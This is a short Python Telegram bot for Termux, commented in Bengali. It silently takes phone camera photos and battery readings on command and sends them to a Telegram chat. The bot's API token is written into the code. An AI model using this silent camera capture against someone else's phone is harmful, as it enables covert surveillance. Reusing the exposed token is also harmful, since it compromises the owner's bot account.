import telebot
import os
import subprocess

# একই টোকেন এখানেও থাকবে
API_TOKEN = '8162300316:AAFh9rxCwRCyG_8st09sooJIU78fLg0md-c'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['snap'])
def take_photo(message):
    os.system("termux-camera-photo -c 0 snap.jpg")
    with open("snap.jpg", "rb") as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove("snap.jpg")

@bot.message_handler(commands=['battery'])
def battery(message):
    status = subprocess.check_output("termux-battery-status", shell=True)
    bot.send_message(message.chat.id, f"🔋 Battery Info:\n{status.decode('utf-8')}")

# কানেক্টেড মেসেজ পাঠানো
print("Phone is now connected to Telegram!")
bot.polling()
